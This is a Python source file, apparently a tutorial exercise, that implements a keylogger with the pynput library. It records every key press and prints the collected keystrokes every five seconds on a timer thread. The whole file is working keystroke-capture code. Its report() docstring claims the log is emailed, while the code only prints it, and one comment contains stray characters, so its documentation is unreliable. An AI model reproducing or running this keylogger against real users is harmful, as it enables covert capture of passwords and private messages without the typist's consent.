'''
Allows us to monitor and control mouse and keyboard.
'''
import pynput.keyboard
import threading

class Keylogger:


    '''
    Constructor. Executed automatically when object is created.
    '''
    def __init__(self):
        self.log = ""

    '''
    Append string to the log.
    '''
    def append_to_log(self, string):
        self.log += string

    '''
    A callback function. A callback function is a function passed to a method so that the method
    can call the function when the method has completed its work.
    '''
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:  #If the key is not a character then an exception is thrown.fde df
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    '''
    Function to send an email about the user key strokes. Runs on a separate thread. 
    A function that calls itself is a recursive function.
    '''
    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)    #After 5 seconds call the function report, runs on a separate thread.
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    #Everytime a key is pressed print it.
        with keyboard_listener:
            self.report()
            keyboard_listener.join()






